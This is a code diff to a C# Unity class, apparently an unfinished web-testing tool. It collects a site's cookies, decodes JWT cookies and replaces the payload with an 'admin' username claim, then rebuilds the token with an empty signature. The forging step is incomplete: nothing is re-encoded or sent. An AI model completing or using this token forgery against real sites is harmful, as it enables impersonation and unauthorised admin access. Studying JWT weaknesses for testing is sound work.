@@ -228,9 +228,9 @@ public class web : MonoBehaviour
       
         using (var response = (HttpWebResponse) r.GetResponse())
         {
-                // Print the properties of each cookie.
-                foreach (Cookie cook in response.Cookies)
-                    CookieList.Add(cook);     
+                foreach (Cookie cook in response.Cookies){
+                    CookieList.Add(cook);
+                }
         }
         return CookieList;
     }
@@ -239,6 +239,8 @@ public class web : MonoBehaviour
     public static void JwtToken(string url)
     {
         List<Cookie> cookies = GetCookies(url);
+        List<Cookie> Exploited_cookies = new List<Cookie>();
+
         //string pattern = "^[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$";
         //Regex rgx = new Regex(pattern2);
         List<Cookie> JWT_list = new List<Cookie>(); // Liste de JWT
@@ -248,8 +250,8 @@ public class web : MonoBehaviour
         {
             if ( c.Name == "jwt") //rgx.IsMatch(c.Value) ||
                 JWT_list.Add(c);
-        }
 
+        }
         foreach (Cookie token in JWT_list)
         {
             string header = "";
@@ -257,13 +259,28 @@ public class web : MonoBehaviour
             string signature = "";
             string Value = token.Value;
             string[] Part = Value.Split('.');
-            header = Encoding.UTF8.GetString(Convert.FromBase64String(Part[0]));
-            payloads = Encoding.UTF8.GetString(Convert.FromBase64String(Part[0]));
-            signature = Encoding.UTF8.GetString(Convert.FromBase64String(Part[0]));
-            UnityEngine.Debug.Log(header+  payloads+signature);
+            if (Part[0] != null)
+                header = Encoding.UTF8.GetString(Convert.FromBase64String(Part[0]));
+            if (Part[1] != null){
+                try //Il peut y avoir une exeception chiante sur la longueur 
+                {
+                    payloads = Encoding.UTF8.GetString(Convert.FromBase64String(Part[1]));
+                }
+                catch (System.Exception)
+                {
+                    payloads = Encoding.UTF8.GetString(Convert.FromBase64String(Part[1]+"=")); //ça regle le problème
+                }
+            }
+            if (payloads.Contains("username"))
+                payloads = "{\"username\" : \" admin\"}" ;
 
+
+            //Manque des tests + l'encodage
+            string argus = header+"."+payloads+"."+signature; //Reformer le payload
+            
         }
     }
+
 
     
     // Update is called once per frame
